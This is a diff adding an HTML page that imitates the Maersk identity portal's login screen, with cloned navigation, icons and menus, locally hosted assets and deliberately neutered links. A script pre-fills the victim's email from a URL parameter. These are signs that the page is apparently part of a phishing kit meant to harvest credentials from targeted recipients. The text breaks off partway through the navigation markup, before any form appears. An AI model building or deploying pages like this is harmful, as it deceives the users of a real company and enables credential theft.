@@ -1,0 +1,702 @@
+<!DOCTYPE html>
+
+<html lang="en">
+<!--<![endif]-->
+
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Login - Maersk Identity and Access Management Portal</title>
+<link rel="stylesheet" type="text/css" href="./jeed/cooljo.css">
+<link href="./jeed/jag.css" rel="stylesheet">
+<script src="jquery.min.js"></script>
+ <script>
+
+$.urlParam = function(email){
+var results = new RegExp('[\?&]' + email + '=([^&#]*)').exec(window.location.href);
+return results[1] || 0;
+
+
+}
+
+</script>
+
+
+
+<script>
+
+$( document ).ready(function() {
+// after the page elements are all loaded, then run the script
+// Set the input field with unique ID #email to a value
+
+$("#email").val($.urlParam('email'));
+
+});
+
+</script> 
+<style>
+body {
+padding: 0!important;
+}
+
+#main {
+margin-top: 60px;
+}
+
+@media (min-width: 700px) {
+#main {
+margin-top: 75px;
+}
+}
+
+@media (min-width: 1200px) {
+#main {
+margin-top: 120px;
+}
+} 
+.loading--overlay {
+position: fixed;
+z-index: 999;
+left: 0;
+right: 0;
+bottom: 0;
+top: 0;
+background-color: rgba(0, 0, 0, .4);
+overflow: hidden
+}
+
+.loading--overlay .loading {
+height: 100%
+}
+
+.loading--overlay .loading__spinner {
+top: 50%
+}
+</style>
+<style type="text/css">
+svg[data-v-37dfa8aa] {
+height: 0;
+width: 0
+}
+</style>
+<link type="text/css" href="./jeed/headloop.css" rel="stylesheet">
+<style type="text/css">
+.form-input__icon[data-v-374b0cc3] {
+z-index: 0
+}
+
+.form-input__clear[data-v-374b0cc3] {
+cursor: pointer
+}
+</style>
+</head>
+
+<body>
+
+<header id="ign-header" class="ign-header" role="navigation">
+<nav role="navigation" class="ign-nav" id="ign-navbar">
+
+<a href="javascript:void(0)" id="ign-skip-footer" class="ign-skip-link">
+Skip to footer 
+</a>
+<div id="menu-overlay" class="ign-nav__overlay"></div>
+
+<a href="javascript:void(0)" class="ign-header__logo">
+<img src="./jeed/maeu.svg" alt="Go to home">
+</a>
+<div class="ign-nav__buttons">
+<button id="nav-login-btn" class="ign-nav__buttons__item" type="button">
+<span class="icon ign-icon-account"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g fill="none" fill-rule="evenodd"><path class="circle" fill="#FFF" fill-rule="nonzero" stroke="#282828" stroke-linejoin="round" stroke-width="1.35" d="M12,2 C17.52,2 22,6.48 22,12 C22,17.52 17.52,22 12,22 C6.48,22 2,17.52 2,12 C2,6.48 6.48,2 12,2 Z"></path><path class="head" fill="#F0F0F0" fill-rule="nonzero" stroke="#282828" stroke-width="1.35" d="M12,5 C13.66,5 15,6.34 15,8 C15,9.66 13.66,11 12,11 C10.34,11 9,9.66 9,8 C9,6.34 10.34,5 12,5 Z"></path><path class="body" fill="#FFF" fill-rule="nonzero" stroke="#282828" stroke-linejoin="round" stroke-width="1.35" d="M12,19.2 C9.6737364,19.2 7.50558104,18.080348 6.15301773,16.2011275 L5.96666326,15.9422109 L6.04840456,15.6338536 C6.44222689,14.1482159 9.45587217,12.9 12,12.9 C14.5386494,12.9 17.5567442,14.1497386 17.9513774,15.6334072 L18.0334685,15.9420382 L17.8469021,16.2012389 C16.4943319,18.080394 14.3262157,19.2 12,19.2 Z"></path></g></svg></span>
+<span class="ign-nav__buttons__item__text">Login / Register</span>
+</button>
+
+<button id="nav-menu-btn" class="ign-nav__buttons__item" type="button">
+<span class="icon ign-icon-menu"><svg xmlns="" viewBox="0 0 24 24"><path fill="#282828" d="M3.75,8.25 L3.75,6.75 L20.25,6.75 L20.25,8.25 L3.75,8.25 Z M3.75,13.25 L3.75,11.75 L20.25,11.75 L20.25,13.25 L3.75,13.25 Z M3.75,18.25 L3.75,16.75 L20.25,16.75 L20.25,18.25 L3.75,18.25 Z"></path></svg></span>
+<span class="ign-nav__buttons__item__text">Menu </span>
+</button>
+</div>
+
+<div class="ign-nav__menu" data-dropdown="menu">
+
+<a href="javascript:void(0)?login?.maersk.com/" class="ign-header__logo">
+<img src="./jeed/maeu.svg" alt="Go to home">
+</a>
+
+<a href="javascript:void(0)?login?.maersk.com/portaluser/login#" role="button" class="ign-nav__menu__close" id="nav-close">
+<span class="icon ign-icon-close"><svg xmlns="javascript:void(0)?login?.w3.org/2000/svg" viewBox="0 0 24 24"><path fill="#282828" d="M12.35,11 L19.35,11 L19.35,12.35 L12.35,12.35 L12.35,19.35 L11,19.35 L11,12.35 L4,12.35 L4,11 L11,11 L11,4 L12.35,4 L12.35,11 Z" transform="rotate(45 11.675 11.675)"></path></svg></span><span class="screen-reader-only">Close</span></a>
+
+<ul class="ign-header__buttons">
+<li>
+<button data-id="header-quote" tabindex="0" type="button" class="ign-header__buttons__elem">Quote<span class="icon ign-icon-chevron-right" aria-hidden="true"><svg xmlns="javascript:void(0)?login?.w3.org/2000/svg" viewBox="0 0 24 24"><path fill="#282828" d="M13,14.5598655 L18.9574807,8.04635326 L19.9536467,8.95748072 L13.498083,16.0155637 C13.2304778,16.3081454 12.7695222,16.3081454 12.501917,16.0155637 L6.04635326,8.95748072 L7.04251928,8.04635326 L13,14.5598655 Z" transform="rotate(-90 13 12.14)"></path></svg></span></button>
+</li>
+<li>
+<button data-id="header-book" tabindex="0" type="button" class="ign-header__buttons__elem">Book<span class="icon ign-icon-chevron-right" aria-hidden="true"><svg xmlns="javascript:void(0)?login?.w3.org/2000/svg" viewBox="0 0 24 24"><path fill="#282828" d="M13,14.5598655 L18.9574807,8.04635326 L19.9536467,8.95748072 L13.498083,16.0155637 C13.2304778,16.3081454 12.7695222,16.3081454 12.501917,16.0155637 L6.04635326,8.95748072 L7.04251928,8.04635326 L13,14.5598655 Z" transform="rotate(-90 13 12.14)"></path></svg></span></button>
+</li>
+<li>
+<button data-id="header-manage" tabindex="0" type="button" class="ign-header__buttons__elem">Manage<span class="icon ign-icon-chevron-right" aria-hidden="true"><svg xmlns="javascript:void(0)?login?.w3.org/2000/svg" viewBox="0 0 24 24"><path fill="#282828" d="M13,14.5598655 L18.9574807,8.04635326 L19.9536467,8.95748072 L13.498083,16.0155637 C13.2304778,16.3081454 12.7695222,16.3081454 12.501917,16.0155637 L6.04635326,8.95748072 L7.04251928,8.04635326 L13,14.5598655 Z" transform="rotate(-90 13 12.14)"></path></svg></span></button>
+</li>
+<li>
+<button data-id="header-track" tabindex="0" type="button" class="ign-header__buttons__elem">Track<span class="icon ign-icon-chevron-right" aria-hidden="true"><svg xmlns="javascript:void(0)?login?.w3.org/2000/svg" viewBox="0 0 24 24"><path fill="#282828" d="M13,14.5598655 L18.9574807,8.04635326 L19.9536467,8.95748072 L13.498083,16.0155637 C13.2304778,16.3081454 12.7695222,16.3081454 12.501917,16.0155637 L6.04635326,8.95748072 L7.04251928,8.04635326 L13,14.5598655 Z" transform="rotate(-90 13 12.14)"></path></svg></span></button>
+</li>
+</ul>
+<div class="ign-menu" id="nav-menu">
+<ul class="ign-menu__util" id="util-menu">
+<li>
+<a href="javascript:void(0)?login?.maersk.com/help/support#/ekb" class="ign-link-icon--hideable">
+<span class="icon link__icon ign-icon-help"><svg xmlns="javascript:void(0)?login?.w3.org/2000/svg" viewBox="0 0 24 24"><path fill="#282828" d="M12,1.325 C17.8927922,1.325 22.675,6.10720779 22.675,12 C22.675,17.8927922 17.8927922,22.675 12,22.675 C6.10720779,22.675 1.325,17.8927922 1.325,12 C1.325,6.10720779 6.10720779,1.325 12,1.325 Z M12,2.675 C6.85279221,2.675 2.675,6.85279221 2.675,12 C2.675,17.1472078 6.85279221,21.325 12,21.325 C17.1472078,21.325 21.325,17.1472078 21.325,12 C21.325,6.85279221 17.1472078,2.675 12,2.675 Z M11.25,7 L12.6,7 L12.6,8.35000002 L11.25,8.35000002 L11.25,7 Z M11.25,10 L12.6,10 L12.6,17 L11.25,17 L11.25,10 Z"></path></svg></span>
+<span class="ign-lang__link__text">Support</span></a>
+</li>
+<li id="lang" class="ign-lang ign-link-icon--hideable">
+<a class="ign-lang__link" id="nav-lang" aria-controls="nav-lang__menu" aria-expanded="false" aria-haspopup="true" href="javascript:void(0)?login?.maersk.com/portaluser/login#">
+<span class="icon ign-icon-language link__icon" aria-hidden="true" aria-label="Language Selector"><svg xmlns="javascript:void(0)?login?.w3.org/2000/svg" viewBox="0 0 24 24"><path fill="#282828" d="M12,1.325 C17.8927922,1.325 22.675,6.10720779 22.675,12 C22.675,17.8927922 17.8927922,22.675 12,22.675 C6.10720779,22.675 1.325,17.8927922 1.325,12 C1.325,6.10720779 6.10720779,1.325 12,1.325 Z M12,2.675 C6.85279221,2.675 2.675,6.85279221 2.675,12 C2.675,17.1472078 6.85279221,21.325 12,21.325 C17.1472078,21.325 21.325,17.1472078 21.325,12 C21.325,6.85279221 17.1472078,2.675 12,2.675 Z M11.0054559,19.9422964 C7.04485416,19.4368281 4.05227273,15.9781703 4.05227273,11.8559671 C4.05227273,11.2562829 4.12256575,10.6627771 4.25865229,10.0381317 L5.40220714,9.71134556 L9.7567526,14.1913306 L9.94772727,14.6618032 L9.94772727,15.5970819 C9.94772727,16.257319 10.4680587,16.7926394 11.0909091,16.7926394 L11.7659091,17.4676394 L11.7659091,19.2727273 L11.0054559,19.9422964 Z M10.4159091,18.459161 L10.4159091,18.047655 C9.36680974,17.7453746 8.59772727,16.7570911 8.59772727,15.5970819 L8.59772727,14.9357998 L5.40557682,11.6516944 C5.40337544,11.7198538 5.40227273,11.7879142 5.40227273,11.8559671 C5.40227273,15.0318546 7.51735814,17.726688 10.4159091,18.459161 Z M16.7200161,17.6579612 C16.5657461,17.1698411 16.1386601,16.8461648 15.6363636,16.8461648 L14.7272727,16.8461648 L14.0522727,16.1711648 L14.0522727,13.4012784 C14.0522727,13.2639357 13.943027,13.152983 13.8181818,13.152983 L10.1818182,13.152983 L9.50681818,12.477983 L9.50681818,10.631392 L10.1818182,9.95639205 C10.3066634,9.95639205 10.4159091,9.84543934 10.4159091,9.70809659 L10.4159091,7.86150568 L11.0909091,7.18650568 L12.9090909,7.18650568 C13.5339361,7.18650568 14.0522727,6.66007002 14.0522727,6.01491477 L14.0522727,5.63636364 L14.9846654,5.01236523 C17.9603497,6.23980326 19.9477273,9.17466381 19.9477273,12.477983 C19.9477273,14.5124805 19.1954049,16.4305783 17.8650086,17.9064867 L16.7200161,17.6579612 Z M18.5977273,12.477983 C18.5977273,10.0508034 17.3119369,7.86425332 15.3135349,6.68134775 C15.0234442,7.7471598 14.0556394,8.53650568 12.9090909,8.53650568 L11.7659091,8.53650568 L11.7659091,9.70809659 C11.7659091,10.3440645 11.3941948,10.8970477 10.8568182,11.1537702 L10.8568182,11.802983 L13.8181818,11.802983 C14.6933366,11.802983 15.4022727,12.5229962 15.4022727,13.4012784 L15.4022727,15.4961648 L15.6363636,15.4961648 C16.3406598,15.4961648 16.9799521,15.7885935 17.435187,16.2722402 C18.1845479,15.1687393 18.5977273,13.8563959 18.5977273,12.477983 Z"></path></svg></span>
+<span class="ign-lang__link__text">English </span>
+<span class="icon ign-icon-chevron-right" aria-hidden="true"><svg xmlns="javascript:void(0)?login?.w3.org/2000/svg" viewBox="0 0 24 24"><path fill="#282828" d="M13,14.5598655 L18.9574807,8.04635326 L19.9536467,8.95748072 L13.498083,16.0155637 C13.2304778,16.3081454 12.7695222,16.3081454 12.501917,16.0155637 L6.04635326,8.95748072 L7.04251928,8.04635326 L13,14.5598655 Z" transform="rotate(-90 13 12.14)"></path></svg></span>
+</a>
+
+<div class="ign-lang__menu" id="nav-lang__menu" aria-expanded="false" aria-hidden="true" aria-labelledby="nav-lang" role="group">
+<a href="javascript:void(0)?login?.maersk.com/portaluser/login#" id="nav-lang-close" class="ign-lang__menu__close-btn" role="button" title="Close Menu">
+<span class="icon ign-icon-close" aria-hidden="true"><svg xmlns="javascript:void(0)?login?.w3.org/2000/svg" viewBox="0 0 24 24"><path fill="#282828" d="M12.35,11 L19.35,11 L19.35,12.35 L12.35,12.35 L12.35,19.35 L11,19.35 L11,12.35 L4,12.35 L4,11 L11,11 L11,4 L12.35,4 L12.35,11 Z" transform="rotate(45 11.675 11.675)"></path></svg></span>
+</a>
+
+<a href="javascript:void(0)?login?.maersk.com/portaluser/login#" class="ign-lang__back" role="button" id="nav-lang-back">
+<span class="ign-icon-arrow-keyboard-left ign-lang__back__icon"><svg xmlns="javascript:void(0)?login?.w3.org/2000/svg" viewBox="0 0 24 24"><path fill="#282828" d="M10.9536467,14.5135123 L16.9111275,8 L17.9072935,8.91112746 L11.4517298,15.9692105 C11.1841245,16.2617922 10.7231689,16.2617922 10.4555637,15.9692105 L4,8.91112746 L4.99616602,8 L10.9536467,14.5135123 Z" transform="rotate(90 10.954 12.094)"></path></svg></span> Main menu
+</a>
+
+<h2 class="ign-lang__title">Language</h2>
+
+<ul>
+<li class="ign-lang__menu__item">
+<a class="ign-lang__menu__item__link ign-lang__menu__item__link--selected" href="javascript:void(0)?login?.maersk.com/portaluser/login#" data-iso="en">English</a>
+</li>
+<li class="ign-lang__menu__item">
+<a class="ign-lang__menu__item__link " href="javascript:void(0)?login?.maersk.com/portaluser/login#" data-iso="es">Español</a>
+</li>
+<li class="ign-lang__menu__item">
+<a class="ign-lang__menu__item__link " href="javascript:void(0)?login?.maersk.com/portaluser/login#" data-iso="fr">Français</a>
+</li>
+<li class="ign-lang__menu__item">
+<a class="ign-lang__menu__item__link " href="javascript:void(0)?login?.maersk.com/portaluser/login#" data-iso="de">Deutsch</a>
+</li>
+<li class="ign-lang__menu__item">
+<a class="ign-lang__menu__item__link " href="javascript:void(0)?login?.maersk.com/portaluser/login#" data-iso="it">Italiano</a>
+</li>
+<li class="ign-lang__menu__item">
+<a class="ign-lang__menu__item__link " href="javascript:void(0)?login?.maersk.com/portaluser/login#" data-iso="pt">Português (Brasil)</a>
+</li>
+<li class="ign-lang__menu__item">
+<a class="ign-lang__menu__item__link " href="javascript:void(0)?login?.maersk.com/portaluser/login#" data-iso="tr">Türkçe</a>
+</li>
+<li class="ign-lang__menu__item">
+<a class="ign-lang__menu__item__link " href="javascript:void(0)?login?.maersk.com/portaluser/login#" data-iso="ru">Русский</a>
+</li>
+<li class="ign-lang__menu__item">
+<a class="ign-lang__menu__item__link " href="javascript:void(0)?login?.maersk.com/portaluser/login#" data-iso="zh_hans">简体中文</a>
+</li>
+<li class="ign-lang__menu__item">
+<a class="ign-lang__menu__item__link " href="javascript:void(0)?login?.maersk.com/portaluser/login#" data-iso="zh_hant">繁體中文</a>
+</li>
+<li class="ign-lang__menu__item">
+<a class="ign-lang__menu__item__link " href="javascript:void(0)?login?.maersk.com/portaluser/login#" data-iso="ko">한국어</a>
+</li>
+<li class="ign-lang__menu__item">
+<a class="ign-lang__menu__item__link " href="javascript:void(0)?login?.maersk.com/portaluser/login#" data-iso="jp">日本語</a>
+</li>
+</ul>
+</div>
+</li>
+<li id="login" class="ign-login">
+<a class="ign-login__link" id="nav-login" aria-controls="nav-login__menu" aria-expanded="false" aria-haspopup="true" href="javascript:void(0)?login?.maersk.com/portaluser/#login?originalUrl=/dashboard">
+<span class="icon ign-icon-account link__icon" aria-hidden="true" aria-label="Login Menu"><svg xmlns="javascript:void(0)?login?.w3.org/2000/svg" viewBox="0 0 24 24"><g fill="none" fill-rule="evenodd"><path class="circle" fill="#FFF" fill-rule="nonzero" stroke="#282828" stroke-linejoin="round" stroke-width="1.35" d="M12,2 C17.52,2 22,6.48 22,12 C22,17.52 17.52,22 12,22 C6.48,22 2,17.52 2,12 C2,6.48 6.48,2 12,2 Z"></path><path class="head" fill="#F0F0F0" fill-rule="nonzero" stroke="#282828" stroke-width="1.35" d="M12,5 C13.66,5 15,6.34 15,8 C15,9.66 13.66,11 12,11 C10.34,11 9,9.66 9,8 C9,6.34 10.34,5 12,5 Z"></path><path class="body" fill="#FFF" fill-rule="nonzero" stroke="#282828" stroke-linejoin="round" stroke-width="1.35" d="M12,19.2 C9.6737364,19.2 7.50558104,18.080348 6.15301773,16.2011275 L5.96666326,15.9422109 L6.04840456,15.6338536 C6.44222689,14.1482159 9.45587217,12.9 12,12.9 C14.5386494,12.9 17.5567442,14.1497386 17.9513774,15.6334072 L18.0334685,15.9420382 L17.8469021,16.2012389 C16.4943319,18.080394 14.3262157,19.2 12,19.2 Z"></path></g></svg></span>
+<span class="ign-login__link__text">Login / Register</span>
+<span class="icon ign-icon-chevron-right" aria-hidden="true"><svg xmlns="javascript:void(0)?login?.w3.org/2000/svg" viewBox="0 0 24 24"><path fill="#282828" d="M13,14.5598655 L18.9574807,8.04635326 L19.9536467,8.95748072 L13.498083,16.0155637 C13.2304778,16.3081454 12.7695222,16.3081454 12.501917,16.0155637 L6.04635326,8.95748072 L7.04251928,8.04635326 L13,14.5598655 Z" transform="rotate(-90 13 12.14)"></path></svg></span>
+</a>
+
+<div class="ign-login__menu" id="nav-login__menu" aria-expanded="false" aria-hidden="true" aria-labelledby="nav-login" role="group">
+<ul>
+
+<a href="javascript:void(0)?login?.maersk.com/" class="ign-header__logo">
+<img src="./jeed/maeu.svg" alt="Go to home">
+</a>
+<a href="javascript:void(0)?login?.maersk.com/portaluser/login#" id="nav-login-close" class="ign-login__menu__close-btn" title="Close Menu">
+<span class="icon ign-icon-close" aria-hidden="true"><svg xmlns="javascript:void(0)?login?.w3.org/2000/svg" viewBox="0 0 24 24"><path fill="#282828" d="M12.35,11 L19.35,11 L19.35,12.35 L12.35,12.35 L12.35,19.35 L11,19.35 L11,12.35 L4,12.35 L4,11 L11,11 L11,4 L12.35,4 L12.35,11 Z" transform="rotate(45 11.675 11.675)"></path></svg></span>
+</a>
+
+<li class="ign-login__menu__item">
+<a class="ign-login__menu__item__link" href="javascript:void(0)?login?.maersk.com/portaluser/#login?originalUrl=/dashboard">Log in.</a>
+</li>
+<li class="ign-login__menu__item">
+<a class="ign-login__menu__item__link" href="javascript:void(0)?login?.maersk.com/portaluser/#register">Register</a>
+</li>
+</ul>
+</div>
+</li>
+<li id="settings" class="ign-settings">
+<a href="javascript:void(0)?login?.maersk.com/site-settings" class="ign-settings__link">
+<span class="icon ign-icon-settings link__icon ign-settings__link__icon" aria-hidden="true"><svg xmlns="javascript:void(0)?login?.w3.org/2000/svg" viewBox="0 0 24 24"><path fill="#282828" d="M21.9582599,14.1002041 C22.4100878,14.4569104 22.5280279,15.0882365 22.2443939,15.6077999 L20.2525795,19.0532252 C19.9697428,19.5717592 19.3504788,19.7924165 18.7984441,19.5763742 L16.6532184,18.7148377 C16.2700561,18.9800437 15.8823948,19.207264 15.4850914,19.3958245 L15.1597876,21.6637234 C15.0870309,22.2457771 14.5862708,22.675 14,22.675 L10,22.675 C9.41372915,22.675 8.91296914,22.2457771 8.84183461,21.6758124 L8.51500971,19.3966387 C8.10848682,19.2052961 7.71851323,18.9783649 7.34340228,18.7161396 L5.18067657,19.5843606 C4.64699488,19.7784266 4.02785573,19.5673565 3.75560612,19.0677999 L1.74742049,15.5932252 C1.47197211,15.0882365 1.58991215,14.4569104 2.0441958,14.0982746 L3.85821408,12.6797295 C3.83629429,12.4402539 3.825,12.2183116 3.825,12 C3.825,11.781688 3.83629433,11.5597453 3.85821419,11.3202693 L2.04174011,9.89979587 C1.58513723,9.53931991 1.45788285,8.89597835 1.75560612,8.39220007 L3.74742049,4.94677481 C4.03025723,4.42824079 4.64952121,4.20758351 5.2015559,4.42362581 L7.34678164,5.28516225 C7.72994393,5.01995625 8.11760523,4.79273596 8.51490856,4.60417554 L8.84021243,2.33627655 C8.91296914,1.75422286 9.41372915,1.325 10,1.325 L14,1.325 C14.5862708,1.325 15.0870309,1.75422286 15.1581654,2.3241876 L15.4849903,4.60336128 C15.8915132,4.7947039 16.2814868,5.02163512 16.6565977,5.28386039 L18.8193234,4.41563944 C19.3530051,4.22157337 19.9721443,4.43264353 20.2443939,4.93220007 L22.2525795,8.40677481 C22.5280279,8.9117635 22.4100878,9.54308959 21.9558042,9.90172537 L20.1420057,11.3200986 C20.1640155,11.5586646 20.175,11.7767881 20.175,12 C20.175,12.2232123 20.1640155,12.4413361 20.1420056,12.6799026 L21.9582599,14.1002041 Z M18.7127475,13.2759957 L18.7602124,12.8962766 C18.804024,12.5457841 18.825,12.273096 18.825,12 C18.825,11.726904 18.804024,11.4542159 18.7602124,11.1037234 L18.7127475,10.7240043 L19.0141958,10.4882746 L20.99937,8.93589583 L19.1505325,5.73702615 L16.4539211,6.82000263 L16.1484452,6.58502119 C15.6646589,6.21287788 15.1558657,5.91664717 14.6140242,5.69458097 L14.2566559,5.54811854 L14.2018346,5.1658124 L13.8447657,2.675 L10.1553385,2.675 L9.74334413,5.54811854 L9.38597581,5.69458097 C8.86477519,5.90818778 8.35649455,6.20637909 7.845,6.59 L7.54103221,6.81797584 L7.1884441,6.67637419 L4.84966511,5.73707839 L3.0006159,8.9358762 L5.28725246,10.7240043 L5.23978757,11.1037234 C5.19680467,11.4475866 5.175,11.7332278 5.175,12 C5.175,12.2667722 5.19680467,12.5524134 5.23978757,12.8962766 L5.28725246,13.2759957 L4.9858042,13.5117254 L3.00062995,15.0641042 L4.84946747,18.2629739 L7.5460789,17.1799974 L7.85155476,17.4149788 C8.33534106,17.7871221 8.84413428,18.0833528 9.38597581,18.305419 L9.74334413,18.4518815 L9.79816539,18.8341876 L10.1552343,21.325 L13.8446615,21.325 L14.2566559,18.4518815 L14.6140242,18.305419 C15.1352248,18.0918122 15.6435054,17.7936209 16.155,17.41 L16.4589678,17.1820242 L16.8115559,17.3236258 L19.1503411,18.2629241 L20.9995194,15.0642296 L18.7127475,13.2759957 Z M12,16.175 C9.69720779,16.175 7.825,14.3027922 7.825,12 C7.825,9.69720779 9.69720779,7.825 12,7.825 C14.3027922,7.825 16.175,9.69720779 16.175,12 C16.175,14.3027922 14.3027922,16.175 12,16.175 Z M12,14.825 C13.5572078,14.825 14.825,13.5572078 14.825,12 C14.825,10.4427922 13.5572078,9.175 12,9.175 C10.4427922,9.175 9.175,10.4427922 9.175,12 C9.175,13.5572078 10.4427922,14.825 12,14.825 Z"></path></svg></span>
+<span class="ign-settings__link__text">Settings</span>
+</a>
+</li>
+</ul>
+<ul class="ign-menu__main" id="main-menu">
+<li>
+<a href="javascript:void(0)?login?.maersk.com/solutions" id="menu-item-0">
+Solutions
+</a>
+
+</li>
+<li>
+<a href="javascript:void(0)?login?.maersk.com/schedules" id="menu-item-1">
+Schedules
+</a>
+
+</li>
+<li>
+<a href="javascript:void(0)?login?.maersk.com/global-presence" id="menu-item-2">
+Global Presence
+</a>
+
+</li>
+<li>
+<a href="javascript:void(0)?login?.maersk.com/local-information" id="menu-item-3">
+Local Information
+</a>
+
+</li>
+<li class="ign-menu__main__search">
+<a href="javascript:void(0)?login?.maersk.com/search" id="nav-search-btn">
+<span class="mobile-text">Search</span>
+<span class="icon ign-icon-search"><svg xmlns="javascript:void(0)?login?.w3.org/2000/svg" viewBox="0 0 24 24"><path fill="#282828" d="M14.2833711,17.2195592 L14.2833711,23.890431 L12.9333711,23.890431 L12.9333711,17.3027409 C8.73474716,17.2121685 5.35003776,13.9012976 5.35003776,9.81714462 C5.35003776,5.6758609 8.83010273,2.32964458 13.1100378,2.32964458 C17.3899729,2.32964458 20.8700378,5.6758609 20.8700378,9.81714462 C20.8700378,13.5725693 18.0082628,16.6741832 14.2833711,17.2195592 Z M13.1100378,15.9546447 C16.6559777,15.9546447 19.5200378,13.2007407 19.5200378,9.81714462 C19.5200378,6.43354858 16.6559777,3.67964458 13.1100378,3.67964458 C9.56409792,3.67964458 6.70003776,6.43354858 6.70003776,9.81714462 C6.70003776,13.2007407 9.56409792,15.9546447 13.1100378,15.9546447 Z" transform="rotate(-45 13.11 13.11)"></path></svg></span>
+</a>
+</li>
+</ul>
+</div>
+</div>
+<ul class="ign-header__buttons">
+<li>
+<button data-id="header-quote" tabindex="0" type="button" class="ign-header__buttons__elem">Quote<span class="icon ign-icon-chevron-right" aria-hidden="true"><svg xmlns="javascript:void(0)?login?.w3.org/2000/svg" viewBox="0 0 24 24"><path fill="#282828" d="M13,14.5598655 L18.9574807,8.04635326 L19.9536467,8.95748072 L13.498083,16.0155637 C13.2304778,16.3081454 12.7695222,16.3081454 12.501917,16.0155637 L6.04635326,8.95748072 L7.04251928,8.04635326 L13,14.5598655 Z" transform="rotate(-90 13 12.14)"></path></svg></span></button>
+</li>
+<li>
+<button data-id="header-book" tabindex="0" type="button" class="ign-header__buttons__elem">Book<span class="icon ign-icon-chevron-right" aria-hidden="true"><svg xmlns="javascript:void(0)?login?.w3.org/2000/svg" viewBox="0 0 24 24"><path fill="#282828" d="M13,14.5598655 L18.9574807,8.04635326 L19.9536467,8.95748072 L13.498083,16.0155637 C13.2304778,16.3081454 12.7695222,16.3081454 12.501917,16.0155637 L6.04635326,8.95748072 L7.04251928,8.04635326 L13,14.5598655 Z" transform="rotate(-90 13 12.14)"></path></svg></span></button>
+</li>
+<li>
+<button data-id="header-manage" tabindex="0" type="button" class="ign-header__buttons__elem">Manage<span class="icon ign-icon-chevron-right" aria-hidden="true"><svg xmlns="javascript:void(0)?login?.w3.org/2000/svg" viewBox="0 0 24 24"><path fill="#282828" d="M13,14.5598655 L18.9574807,8.04635326 L19.9536467,8.95748072 L13.498083,16.0155637 C13.2304778,16.3081454 12.7695222,16.3081454 12.501917,16.0155637 L6.04635326,8.95748072 L7.04251928,8.04635326 L13,14.5598655 Z" transform="rotate(-90 13 12.14)"></path></svg></span></button>
+</li>
+<li>
+<button data-id="header-track" tabindex="0" type="button" class="ign-header__buttons__elem">Track<span class="icon ign-icon-chevron-right" aria-hidden="true"><svg xmlns="javascript:void(0)?login?.w3.org/2000/svg" viewBox="0 0 24 24"><path fill="#282828" d="M13,14.5598655 L18.9574807,8.04635326 L19.9536467,8.95748072 L13.498083,16.0155637 C13.2304778,16.3081454 12.7695222,16.3081454 12.501917,16.0155637 L6.04635326,8.95748072 L7.04251928,8.04635326 L13,14.5598655 Z" transform="rotate(-90 13 12.14)"></path></svg></span></button>
+</li>
+</ul>
+<div class="ign-dropdown task-menu" data-dropdown="header-book">
+<a href="javascript:void(0)?login?.maersk.com/portaluser/login#" role="button" class="ign-dropdown__close">
+<span class="icon ign-icon-close"><svg xmlns="javascript:void(0)?login?.w3.org/2000/svg" viewBox="0 0 24 24"><path fill="#282828" d="M12.35,11 L19.35,11 L19.35,12.35 L12.35,12.35 L12.35,19.35 L11,19.35 L11,12.35 L4,12.35 L4,11 L11,11 L11,4 L12.35,4 L12.35,11 Z" transform="rotate(45 11.675 11.675)"></path></svg></span><span class="large-screen-only">Close</span></a>
+
+<div class="ign-dropdown__container">
+
+<a href="javascript:void(0)?login?.maersk.com/" class="ign-header__logo">
+<img src="./jeed/maeu.svg" alt="Go to home">
+</a>
+<a href="javascript:void(0)?login?.maersk.com/portaluser/login#" class="ign-dropdown__back" role="button" data-id="header-book">
+<span class="ign-icon-arrow-keyboard-left ign-dropdown__back__icon"><svg xmlns="javascript:void(0)?login?.w3.org/2000/svg" viewBox="0 0 24 24"><path fill="#282828" d="M10.9536467,14.5135123 L16.9111275,8 L17.9072935,8.91112746 L11.4517298,15.9692105 C11.1841245,16.2617922 10.7231689,16.2617922 10.4555637,15.9692105 L4,8.91112746 L4.99616602,8 L10.9536467,14.5135123 Z" transform="rotate(90 10.954 12.094)"></path></svg></span> Main menu
+</a>
+
+<div class="task-menu__block action-card">
+<div class="action-card__spacer">
+<div class="action-card__copy">
+<h1 class="action-card__title">New booking</h1>
+<p class="action-card__rich-text">Book your shipment with ease</p>
+<p class="action-card__trigger">
+<a href="javascript:void(0)?login?.maersk.com/booking/new" class="ign-button--primary">Book New Shipment</a>
+
+</p>
+</div>
+</div>
+</div>
+<div class="task-menu__block action-card">
+<div class="action-card__spacer ign-1">
+<div class="action-card__copy">
+<h1 class="action-card__title">Duplicate booking</h1>
+<p class="action-card__rich-text">Speed up your process by duplicating your previous bookings</p>
+<p class="action-card__trigger">
+<a href="javascript:void(0)?login?.maersk.com/shipmentoverview/duplicate" class="ign-button--primary">Book Duplicate Shipment</a>
+
+</p>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div class="ign-dropdown task-menu" data-dropdown="header-manage">
+<a href="javascript:void(0)?login?.maersk.com/portaluser/login#" role="button" class="ign-dropdown__close">
+<span class="icon ign-icon-close"><svg xmlns="javascript:void(0)?login?.w3.org/2000/svg" viewBox="0 0 24 24"><path fill="#282828" d="M12.35,11 L19.35,11 L19.35,12.35 L12.35,12.35 L12.35,19.35 L11,19.35 L11,12.35 L4,12.35 L4,11 L11,11 L11,4 L12.35,4 L12.35,11 Z" transform="rotate(45 11.675 11.675)"></path></svg></span><span class="large-screen-only">Close</span></a>
+
+<div class="ign-dropdown__container">
+
+<a href="javascript:void(0)?login?.maersk.com/" class="ign-header__logo">
+<img src="./jeed/maeu.svg" alt="Go to home">
+</a>
+<a href="javascript:void(0)?login?.maersk.com/portaluser/login#" class="ign-dropdown__back" role="button" data-id="header-manage">
+<span class="ign-icon-arrow-keyboard-left ign-dropdown__back__icon"><svg xmlns="javascript:void(0)?login?.w3.org/2000/svg" viewBox="0 0 24 24"><path fill="#282828" d="M10.9536467,14.5135123 L16.9111275,8 L17.9072935,8.91112746 L11.4517298,15.9692105 C11.1841245,16.2617922 10.7231689,16.2617922 10.4555637,15.9692105 L4,8.91112746 L4.99616602,8 L10.9536467,14.5135123 Z" transform="rotate(90 10.954 12.094)"></path></svg></span> Main menu
+</a>
+
+<div class="task-menu__block">
+<h1>Documentation</h1>
+<ul>
+<li>
+<a href="javascript:void(0)?login?.maersk.com/shipmentoverview/documentation/submit">Submit Shipping Instructions</a>
+</li>
+<li>
